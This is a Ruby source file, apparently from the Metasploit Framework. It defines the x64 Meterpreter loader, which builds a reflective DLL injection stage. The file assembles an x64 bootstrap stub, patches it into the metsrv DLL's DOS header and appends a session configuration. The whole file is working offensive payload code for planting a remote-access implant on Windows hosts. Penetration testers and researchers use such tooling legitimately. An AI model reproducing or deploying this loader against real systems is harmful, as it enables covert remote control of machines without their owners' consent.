# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/reflective_dll_loader'
require 'rex/payloads/meterpreter/config'

module Msf

###
#
# Common module stub for ARCH_X64 payloads that make use of Meterpreter.
#
###


module Payload::Windows::MeterpreterLoader_x64

  include Msf::ReflectiveDLLLoader
  include Msf::Payload::Windows

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Reflective DLL Injection',
      'Description'   => 'Inject a DLL via a reflective loader',
      'Author'        => [ 'sf', 'OJ Reeves' ],
      'References'    => [
        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
        [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
      ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X64,
      'PayloadCompat' => { 'Convention' => 'sockrdi handlerdi -https' },
      'Stage'         => { 'Payload'   => "" }
      ))
  end

  def asm_invoke_metsrv(opts={})
    asm = %Q^
        ; prologue
          db 0x4d, 0x5a         ; 'MZ' = "pop r10"
          push r10              ; back to where we started
          push rbp              ; save rbp
          mov rbp, rsp          ; set up a new stack frame
          sub rsp, 32           ; allocate some space for calls.
          and rsp, ~0xF         ; Ensure RSP is 16 byte aligned
        ; GetPC
          call $+5              ; relative call to get location
          pop rbx               ; pop return value
        ; Invoke ReflectiveLoader()
          ; add the offset to ReflectiveLoader()
          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x15)}
          call rbx              ; invoke ReflectiveLoader()
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
          ; offset from ReflectiveLoader() to the end of the DLL
          add rbx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
    ^

    unless opts[:stageless] || opts[:force_write_handle] == true
      asm << %Q^
          ; store the comms socket or handle
          mov [rbx], rdi
      ^
    end

    asm << %Q^
          mov r8, rbx           ; r8 points to the extension list
          push 4                ; push up 4, indicate that we have attached
          pop rdx               ; pop 4 into rdx
          call rax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
    ^
  end

  def stage_payload(opts={})
    stage_meterpreter(opts) + generate_config(opts)
  end

  def generate_config(opts={})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      arch:              opts[:uuid].arch,
      null_session_guid: opts[:null_session_guid] == true,
      exitfunk:          ds[:exit_func] || ds['EXITFUNC'],
      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
      uuid:              opts[:uuid],
      transports:        opts[:transport_config] || [transport_config(opts)],
      extensions:        [],
      stageless:         opts[:stageless] == true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

  def stage_meterpreter(opts={})
    # Exceptions will be thrown by the mixin if there are issues.
    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll'))

    asm_opts = {
      rdi_offset: offset,
      length:     dll.length,
      stageless:  opts[:stageless] == true
    }

    asm = asm_invoke_metsrv(asm_opts)

    # generate the bootstrap asm
    bootstrap = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    if bootstrap.length > 62
      raise RuntimeError, "Meterpreter loader (x64) generated an oversized bootstrap!"
    end

    # patch the bootstrap code into the dll's DOS header...
    dll[ 0, bootstrap.length ] = bootstrap

    dll
  end

end

end


